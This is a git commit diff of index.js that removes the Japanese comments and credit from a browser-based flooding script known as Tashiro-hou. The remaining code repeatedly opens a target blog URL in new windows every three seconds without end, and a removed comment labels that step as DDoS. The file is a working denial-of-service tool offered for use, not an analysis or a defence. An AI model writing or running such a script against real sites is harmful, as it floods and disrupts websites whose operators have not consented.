5740f35df55c328ac5b277f2f838b5add41b1268
true525 <104573302+true525@users.noreply.github.com>
2024-05-19 19:32:25 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,17 +1,8 @@
-<!--
-『JavaScriptで田代砲v1.01』
-Producted by 真鍋
-https://sirakabaararagi.hatenablog.com/
--->
-
-<!--■■■初期値■■■-->
 <script>
 var attackURL='https://sirakabaararagi.hatenablog.com/entry/2021/11/17/142613';
-var interval=3000;//1秒=1000
+var interval=3000;
 </script>
 
-<!--▼▼▼田代砲ソースコード▼▼▼-->
-<!--初期画面-->
 <script>
 var txt ='<tt>'
         +'<br>AttackURL：'+attackURL
@@ -21,20 +12,16 @@ var txt ='<tt>'
 document.write(txt);
 </script>
 
-<!--処理-->
 <script>
 var i=0;
 function zp(i){if(i<1000){return ('00'+i).slice(-3);}else{return i;}}
 function tt(att){return '<tt style="font-size:xx-small;'+att+'">';}
   
 window.setInterval(function(){
-  //初期画面の転写
   if(i==0){document.write(txt+'<br>');}
   
-  //DDoS
   window.open(attackURL,null,'top=0,left=0,width=100,height=100');
   
-  //ループ回数表示
   i++;
   if(i%100==1){document.write(tt("color:red;")+(i-1)+'</tt><br>');}
   document.write(tt()+zp(i)+' '+'</tt>');
@@ -42,4 +29,3 @@ window.setInterval(function(){
   scrollTo(0,i*10);
 }, interval);
 </script>
-<!--▲▲▲田代砲ソースコード▲▲▲-->
